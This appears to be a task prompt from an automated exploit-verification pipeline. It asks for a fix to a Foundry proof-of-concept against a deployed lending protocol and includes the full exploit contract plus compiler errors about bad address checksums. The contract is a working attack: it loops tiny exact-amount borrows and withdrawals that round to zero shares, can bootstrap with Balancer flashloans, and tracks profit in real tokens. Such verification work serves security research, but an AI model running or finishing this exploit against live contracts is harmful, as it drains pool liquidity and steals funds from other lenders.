You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Exact-amount borrows and withdrawals can round to zero shares and bypass accounting
- claim: `calculateLendingShares()` and `calculateBorrowShares()` floor-divide the requested amount by the current share price, but the exact-amount withdraw and borrow flows never require the returned share amount to be nonzero. After interest pushes `pseudoTotalPool > totalDepositShares` or `pseudoTotalBorrowAmount > totalBorrowShares`, a small exact-amount withdrawal can burn 0 lending shares while still transferring tokens out, and a small exact-amount borrow can mint 0 borrow shares while still transferring tokens to the borrower.
- impact: An attacker can repeatedly drain pool liquidity with tiny exact-amount borrows that never increase their debt shares. Separately, a lender can repeatedly withdraw small exact amounts without burning deposit shares, stealing value from other lenders and eventually emptying the pool.
- exploit_paths: ["Wait until a pool's share price exceeds 1 unit so that a small amount maps to 0 shares.", "Call `borrowExactAmount`, `borrowExactAmountETH`, or `borrowOnBehalfExactAmount` with an amount that makes `calculateBorrowShares(...) == 0`.", "Call `withdrawExactAmount`, `withdrawExactAmountETH`, or `withdrawOnBehalfExactAmount` with an amount that makes `calculateLendingShares(...) == 0`, repeating as long as liquidity remains."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWiseLendingLike {
    function WETH_ADDRESS() external view returns (address);
    function POSITION_NFT() external view returns (address);
    function WISE_SECURITY() external view returns (address);

    function lendingPoolData(address poolToken)
        external
        view
        returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);

    function borrowPoolData(address poolToken)
        external
        view
        returns (bool allowBorrow, uint256 pseudoTotalBorrowAmount, uint256 totalBorrowShares, uint256 borrowRate);

    function getTotalPool(address poolToken) external view returns (uint256);
    function calculateLendingShares(address poolToken, uint256 amount) external view returns (uint256);
    function calculateBorrowShares(address poolToken, uint256 amount) external view returns (uint256);

    function depositExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function withdrawExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function withdrawExactAmountETH(uint256 nftId, uint256 amount) external returns (uint256);
    function withdrawOnBehalfExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function borrowExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function borrowExactAmountETH(uint256 nftId, uint256 amount) external returns (uint256);
    function borrowOnBehalfExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function collateralizeDeposit(uint256 nftId, address poolToken) external;
}

interface IPositionNFTsLike {
    function reservePosition() external;
    function reserved(address owner) external view returns (uint256);
}

interface IWiseSecurityLike {
    function checksBorrow(uint256 nftId, address caller, address poolToken, uint256 amount) external view;
    function checksWithdraw(uint256 nftId, address caller, address poolToken, uint256 amount) external view;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    error NoProfitableOpportunity();
    error PoolPreconditionsNotMet();
    error BorrowPathUnavailable();
    error WithdrawPathUnavailable();
    error FlashLoanNotFromVault();
    error Unauthorized();

    address internal constant TARGET = 0x84524bAa1951247b3A2617A843e6eCe915Bb9674;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    uint256 internal constant MAX_BORROW_LOOPS = 512;
    uint256 internal constant MAX_WITHDRAW_LOOPS = 512;
    uint256 internal constant COLLATERAL_SCALE = 1e18;

    IWiseLendingLike internal constant WISE = IWiseLendingLike(TARGET);

    address private _profitToken;
    uint256 private _profitAmount;

    struct FlashContext {
        address token;
        uint256 bootstrapAmount;
        uint256 borrowAmount;
        uint256 withdrawAmount;
        uint256 startingBalance;
    }

    modifier onlySelf() {
        if (msg.sender != address(this)) revert Unauthorized();
        _;
    }

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        address[] memory candidates = _candidateTokens();

        if (_attemptDirectBalances(candidates)) {
            return;
        }

        if (_attemptFlashLoanBootstrap(candidates)) {
            return;
        }

        revert NoProfitableOpportunity();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptDirectBalances(address[] memory candidates) internal returns (bool) {
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token == address(0)) {
                continue;
            }

            (bool valid, uint256 bootstrapAmount, uint256 borrowAmount, uint256 withdrawAmount) = _poolPlan(token);
            if (!valid) {
                continue;
            }

            uint256 balance = IERC20Minimal(token).balanceOf(address(this));
            if (balance < bootstrapAmount) {
                continue;
            }

            try this.runDirectAttack(token, bootstrapAmount, borrowAmount, withdrawAmount, balance) returns (uint256 profit) {
                if (profit > 0) {
                    _profitToken = token;
                    _profitAmount = profit;
                    return true;
                }
            } catch {
                continue;
            }
        }

        return false;
    }

    function _attemptFlashLoanBootstrap(address[] memory candidates) internal returns (bool) {
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token == address(0)) {
                continue;
            }

            (bool valid, uint256 bootstrapAmount, uint256 borrowAmount, uint256 withdrawAmount) = _poolPlan(token);
            if (!valid) {
                continue;
            }

            uint256 startingBalance = IERC20Minimal(token).balanceOf(address(this));

            try this.requestFlashLoanAttack(token, bootstrapAmount, borrowAmount, withdrawAmount, startingBalance) returns (uint256 profit) {
                if (profit > 0) {
                    _profitToken = token;
                    _profitAmount = profit;
                    return true;
                }
            } catch {
                continue;
            }
        }

        return false;
    }

    function runDirectAttack(
        address token,
        uint256 bootstrapAmount,
        uint256 borrowAmount,
        uint256 withdrawAmount,
        uint256 startingBalance
    )
        external
        onlySelf
        returns (uint256)
    {
        _executeAttack(token, bootstrapAmount, borrowAmount, withdrawAmount, bootstrapAmount + 1);

        uint256 endingBalance = IERC20Minimal(token).balanceOf(address(this));
        if (endingBalance <= startingBalance) {
            revert NoProfitableOpportunity();
        }

        return endingBalance - startingBalance;
    }

    function requestFlashLoanAttack(
        address token,
        uint256 bootstrapAmount,
        uint256 borrowAmount,
        uint256 withdrawAmount,
        uint256 startingBalance
    )
        external
        onlySelf
        returns (uint256)
    {
        IERC20Minimal[] memory tokens = new IERC20Minimal[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Minimal(token);
        amounts[0] = bootstrapAmount;

        bytes memory userData = abi.encode(
            FlashContext({
                token: token,
                bootstrapAmount: bootstrapAmount,
                borrowAmount: borrowAmount,
                withdrawAmount: withdrawAmount,
                startingBalance: startingBalance
            })
        );

        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, userData);

        uint256 endingBalance = IERC20Minimal(token).balanceOf(address(this));
        if (endingBalance <= startingBalance) {
            revert NoProfitableOpportunity();
        }

        return endingBalance - startingBalance;
    }

    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    )
        external
        override
    {
        if (msg.sender != BALANCER_VAULT) revert FlashLoanNotFromVault();

        FlashContext memory ctx = abi.decode(userData, (FlashContext));

        _executeAttack(
            ctx.token,
            ctx.bootstrapAmount,
            ctx.borrowAmount,
            ctx.withdrawAmount,
            ctx.bootstrapAmount + feeAmounts[0] + 1
        );

        _forceApprove(ctx.token, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
        tokens;
    }

    function _executeAttack(
        address token,
        uint256 bootstrapAmount,
        uint256 borrowAmount,
        uint256 withdrawAmount,
        uint256 requiredGross
    )
        internal
    {
        // The root cause is the exact-amount path executing while calculateBorrowShares(...) == 0.
        // The same bug family exists on borrowExactAmount, borrowExactAmountETH, and borrowOnBehalfExactAmount.
        // The PoC uses the ERC20 branch because it is the simplest public on-chain route with existing pool tokens.
        if (!_isZeroBorrowSharePath(token, borrowAmount) || !_isZeroWithdrawSharePath(token, withdrawAmount)) {
            revert PoolPreconditionsNotMet();
        }

        _forceApprove(token, TARGET, type(uint256).max);

        uint256 nftId = _reservePosition();
        WISE.depositExactAmount(nftId, token, bootstrapAmount);

        // The extra collateralize call is only to avoid reserved-position defaults varying by deployment.
        try WISE.collateralizeDeposit(nftId, token) {} catch {}

        uint256 grossRealized;
        bool didBorrow;
        bool didWithdraw;

        for (uint256 i = 0; i < MAX_BORROW_LOOPS; ++i) {
            if (grossRealized >= requiredGross && didBorrow) {
                break;
            }

            if (WISE.getTotalPool(token) < borrowAmount) {
                break;
            }

            if (!_isZeroBorrowSharePath(token, borrowAmount)) {
                break;
            }

            if (!_canBorrow(nftId, token, borrowAmount)) {
                break;
            }

            WISE.borrowExactAmount(nftId, token, borrowAmount);
            grossRealized += borrowAmount;
            didBorrow = true;
        }

        if (!didBorrow) {
            revert BorrowPathUnavailable();
        }

        // This is the second exact-amount stage from the hypothesis: withdraw while calculateLendingShares(...) == 0.
        // The same bug family exists on withdrawExactAmount, withdrawExactAmountETH, and withdrawOnBehalfExactAmount.
        for (uint256 i = 0; i < MAX_WITHDRAW_LOOPS; ++i) {
            if (grossRealized >= requiredGross && didWithdraw) {
                break;
            }

            if (WISE.getTotalPool(token) < withdrawAmount) {
                break;
            }

            if (!_isZeroWithdrawSharePath(token, withdrawAmount)) {
                break;
            }

            if (!_canWithdraw(nftId, token, withdrawAmount)) {
                break;
            }

            WISE.withdrawExactAmount(nftId, token, withdrawAmount);
            grossRealized += withdrawAmount;
            didWithdraw = true;
        }

        if (!didWithdraw) {
            revert WithdrawPathUnavailable();
        }

        if (grossRealized <= requiredGross - 1) {
            revert NoProfitableOpportunity();
        }
    }

    function _poolPlan(address token)
        internal
        view
        returns (bool valid, uint256 bootstrapAmount, uint256 borrowAmount, uint256 withdrawAmount)
    {
        (bool allowBorrow, uint256 pseudoTotalBorrowAmount, uint256 totalBorrowShares,) = WISE.borrowPoolData(token);
        (uint256 pseudoPool, uint256 totalDepositShares, uint256 collateralFactor) = WISE.lendingPoolData(token);

        if (!allowBorrow || pseudoTotalBorrowAmount == 0 || totalBorrowShares <= 1 || pseudoPool == 0 || totalDepositShares <= 1) {
            return (false, 0, 0, 0);
        }

        // If either threshold is zero at the fork state, this pool does not satisfy the finding precondition yet.
        borrowAmount = (pseudoTotalBorrowAmount - 1) / totalBorrowShares;
        withdrawAmount = (pseudoPool - 1) / totalDepositShares;

        if (borrowAmount == 0 || withdrawAmount == 0) {
            return (false, 0, 0, 0);
        }

        if (collateralFactor == 0) {
            return (false, 0, 0, 0);
        }

        uint256 collateralForBorrow = _ceilDiv(borrowAmount * COLLATERAL_SCALE, collateralFactor);

        // Bootstrap must mint at least one lending share, so it must sit above the zero-share withdraw threshold.
        bootstrapAmount = withdrawAmount + 1;
        if (bootstrapAmount < collateralForBorrow + 1) {
            bootstrapAmount = collateralForBorrow + 1;
        }

        uint256 mintedShares = WISE.calculateLendingShares(token, bootstrapAmount);
        if (mintedShares == 0) {
            return (false, 0, 0, 0);
        }

        // The PoC must still reach the zero-share withdraw branch after the bootstrap deposit.
        if ((pseudoPool + bootstrapAmount - 1) / (totalDepositShares + mintedShares) == 0) {
            return (false, 0, 0, 0);
        }

        if (WISE.getTotalPool(token) + bootstrapAmount < borrowAmount + withdrawAmount) {
            return (false, 0, 0, 0);
        }

        valid = true;
    }

    function _reservePosition() internal returns (uint256 nftId) {
        IPositionNFTsLike positionNft = IPositionNFTsLike(WISE.POSITION_NFT());
        positionNft.reservePosition();
        nftId = positionNft.reserved(address(this));
    }

    function _isZeroBorrowSharePath(address token, uint256 amount) internal view returns (bool) {
        return WISE.calculateBorrowShares(token, amount) == 0;
    }

    function _isZeroWithdrawSharePath(address token, uint256 amount) internal view returns (bool) {
        return WISE.calculateLendingShares(token, amount) == 0;
    }

    function _canBorrow(uint256 nftId, address token, uint256 amount) internal view returns (bool) {
        try IWiseSecurityLike(WISE.WISE_SECURITY()).checksBorrow(nftId, address(this), token, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _canWithdraw(uint256 nftId, address token, uint256 amount) internal view returns (bool) {
        try IWiseSecurityLike(WISE.WISE_SECURITY()).checksWithdraw(nftId, address(this), token, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _candidateTokens() internal view returns (address[] memory tokens) {
        tokens = new address[](14);
        tokens[0] = WISE.WETH_ADDRESS();
        tokens[1] = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48; // USDC
        tokens[2] = 0xdac17f958d2ee523a2206206994597c13d831ec7; // USDT
        tokens[3] = 0x6b175474e89094c44da98b954eedeac495271d0f; // DAI
        tokens[4] = 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599; // WBTC
        tokens[5] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // stETH
        tokens[6] = 0x7f39C581F595b53c5Cb5b5f0ddA6c935e2CA0A0B; // wstETH
        tokens[7] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704; // cbETH
        tokens[8] = 0xae78736Cd615f374D3085123A210448E74Fc6393; // rETH
        tokens[9] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0; // LUSD
        tokens[10] = 0x853d955aCEf822Db058eb8505911ED77F175b99e; // FRAX
        tokens[11] = address(0); // intentionally skipped: unresolved local checksum-safe candidate
        tokens[12] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51; // sUSD
        tokens[13] = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E; // crvUSD
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));

        if (success && (data.length == 0 || abi.decode(data, (bool)))) {
            return;
        }

        (success, data) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-reset");

        (success, data) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-set");
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : (a - 1) / b + 1;
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:437:21:
    |
437 |         tokens[1] = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48; // USDC
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xdAC17F958D2ee523a2206206994597C13D831ec7". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xdAC17F958D2ee523a2206206994597C13D831ec7". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:438:21:
    |
438 |         tokens[2] = 0xdac17f958d2ee523a2206206994597c13d831ec7; // USDT
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x6B175474E89094C44Da98b954EedeAC495271d0F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x6B175474E89094C44Da98b954EedeAC495271d0F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:439:21:
    |
439 |         tokens[3] = 0x6b175474e89094c44da98b954eedeac495271d0f; // DAI
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:440:21:
    |
440 |         tokens[4] = 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599; // WBTC
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
